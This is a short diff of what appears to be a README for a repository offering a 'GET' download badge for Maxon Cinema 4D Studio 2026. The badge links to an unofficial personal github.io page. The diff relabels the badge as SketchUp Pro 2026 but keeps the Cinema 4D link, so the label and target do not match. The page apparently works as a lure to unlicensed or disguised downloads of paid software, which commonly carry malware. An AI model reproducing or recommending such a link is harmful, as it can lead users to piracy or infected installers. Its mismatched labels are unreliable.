@@ -2,7 +2,7 @@
 
 ![Maxon Cinema 4D Studio 2026 Banner Placeholder](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxr25gsjy0ghg32NUDAKi_YQARn6NprncgnYlmvODieA&s=10)
 
-[![GET — Maxon Cinema 4D Studio 2026](https://img.shields.io/badge/GET%20%E2%80%94%20Maxon%20Cinema%204D%20Studio%202026-0078D6?style=for-the-badge&logoColor=white)](https://ginalv8908.github.io/.github/Maxon-Cinema-4D-Studio-2026)
+[![GET — Maxon Cinema 4D Studio 2026](https://img.shields.io/badge/GET%20%E2%80%94%20SketchUp%20Pro%202026-0078D6?style=for-the-badge&logoColor=white)](https://ginalv8908.github.io/.github/Maxon-Cinema-4D-Studio-2026)
 
 ---
 
